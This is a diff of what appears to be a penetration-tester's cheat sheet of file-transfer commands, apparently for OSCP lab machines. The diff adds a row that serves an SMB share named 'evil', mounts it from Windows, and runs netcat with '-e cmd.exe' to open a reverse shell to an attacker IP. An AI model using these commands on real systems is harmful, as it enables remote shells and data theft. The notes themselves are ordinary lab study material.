@@ -191,7 +191,7 @@
 <tr><td>php -S 0.0.0.0:PORT</td><td>PHP builtin web server bundle</td></tr>
 <tr><td>nc -q 0 -lvp 443 &lt; file</td><td>Netcat listener to transfer files</td></tr>
 <tr><td>nc -nv IP_ADDR 443 &lt; file</td><td>Netcat command to send files</td></tr>
-<tr><td>smbserver.py SHARE share_dir                                            or                                                                                             impacket-smbserver -smb2support Share /home/kali/Documents/pen200/PG/Jacko<br></td><td>Impacket’s smbserver.py script simulates a SMB server</td></tr>
+<tr><td>smbserver.py SHARE share_dir                                            or                                                                                             impacket-smbserver -smb2support Share /home/kali/Documents/pen200/PG/Jacko                         or                   smbserver.py -smb2support -username evil -password evil evil $PWD<br>                                      then                                                                       net use z: \192.168.49.57\evil /user:evil evil<br>Z:\nc.exe 192.168.49.57 80 -e cmd.exe<br></td><td>Impacket’s smbserver.py script simulates a SMB server</td></tr>
 <tr><td>service smbd start; systemctl start smbd</td><td>Linux Samba, a share has to be added to /etc/samba/smb.conf</td></tr>
 <tr><td>service pure-ftpd start; systemctl start pure-ftpd; service proftpd start; systemctl start proftpd</td><td>Services such as pure-ftpd and proftpd can be used to setup FTP servers</td></tr>
 <tr><td>atftpd –daemon –port 69 ftp_dir</td><td>The atftpd utility allows to easily setup a TFTP server</td></tr>
